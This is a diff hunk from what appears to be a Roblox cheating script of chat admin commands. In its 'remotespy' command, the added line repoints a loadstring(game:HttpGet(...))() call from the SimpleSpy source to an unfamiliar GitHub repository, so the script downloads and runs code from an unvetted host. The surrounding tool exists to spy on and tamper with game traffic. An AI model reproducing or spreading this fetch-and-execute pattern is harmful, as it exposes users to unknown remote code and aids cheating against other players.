@@ -10242,7 +10242,7 @@ addcmd('remotespy',{'rspy'},function(args, speaker)
 	notify("Loading",'Hold on a sec')
 	-- Full credit to exx, creator of SimpleSpy
 	-- also thanks to NoobSploit for fixing
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/RS/main/SimpleSpyMobile"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/474375w/djdbejxd/main/%E8%BF%9C%E7%A8%8B%E9%97%B4%E8%B0%8D"))()
 end)
 
 addcmd('audiologger',{'alogger'},function(args, speaker)
